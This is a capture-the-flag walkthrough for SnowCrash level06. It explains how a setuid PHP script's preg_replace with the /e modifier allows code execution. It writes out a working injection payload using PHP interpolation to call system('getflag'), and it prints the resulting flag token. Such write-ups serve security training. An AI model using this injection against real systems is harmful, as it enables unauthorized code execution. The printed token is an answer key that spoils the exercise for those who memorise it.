# SnowCrash - Level06

## Objective

Find the password for the next level by logging into the `flag06` account.

## Steps

### 1. Locate files needed for the challenge
```bash
ls 
```

```bash
level06@SnowCrash:~$ ls
level06  level06.php
```


The level06 executable calls execve on the php script, it basically just executes it with setuid privileges, the goal is to execute vulnerable code into the regex, it takes a file as an argument and executes it as php code with /e (deprecated in recent php versions)
```bash
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

It's easy to spot that the regex expects your input to be formatted as such `[x ]` so we will have to craft our expression there and have it interpreted.

You can also see that it replaces some characters during parsing, it replaces . with " x" and @ with " y", so our input is limited. One easy method is to use interpolation inside php, it's normally meant to evaluate variables but you can use it for expressions too, so execute any kind of code in short.

```bash
level06@SnowCrash:~$ echo '[x "{${system('getflag')}}"]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
""
```